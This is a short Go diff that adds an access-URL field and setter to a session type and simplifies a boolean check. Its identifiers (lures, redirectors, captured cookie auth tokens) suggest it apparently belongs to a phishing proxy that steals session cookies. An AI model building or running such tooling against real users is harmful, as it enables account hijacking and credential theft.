@@ -26,6 +26,7 @@ type Session struct {
 	RedirectorName string
 	LureDirPath    string
 	DoneSignal     chan struct{}
+	AccessURL	   string
 }
 
 func NewSession(name string) (*Session, error) {
@@ -48,6 +49,7 @@ func NewSession(name string) (*Session, error) {
 		RedirectorName: "",
 		LureDirPath:    "",
 		DoneSignal:     make(chan struct{}),
+		AccessURL:      "",
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -65,6 +67,11 @@ func (s *Session) SetPassword(password string) {
 func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
+
+func (s *Session) SetAccessURL(url string) {
+	s.AccessURL = url
+}
+
 
 func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
 	if _, ok := s.CookieTokens[domain]; !ok {
@@ -119,10 +126,7 @@ func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAut
 		}
 	}
 
-	if len(tcopy) == 0 {
-		return true
-	}
-	return false
+	return len(tcopy) == 0
 }
 
 func (s *Session) Finish(is_auth_url bool) {
